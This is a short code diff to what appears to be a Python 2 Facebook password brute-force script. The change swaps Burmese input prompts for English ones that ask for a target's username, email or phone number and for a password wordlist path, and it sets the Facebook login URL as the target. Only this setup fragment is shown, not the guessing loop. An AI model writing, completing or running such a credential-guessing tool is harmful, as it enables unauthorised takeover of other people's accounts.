@@ -4,10 +4,9 @@ import mechanize
 import cookielib
 import random
 
+email = str(raw_input("Enter the Facebook Username (or) Email (or) Phone Number : "))
+passwordlist = str(raw_input("Enter the wordlist name and path : "))
 
-email = str(raw_input("user nameထည့္ (or) Emailထည့္(or) Phone နံပါတ္ထည့္: "))
-
-passwordlist = str(raw_input("password file : ")) 
 
 login = 'https://www.facebook.com/login.php?login_attempt=1'
 
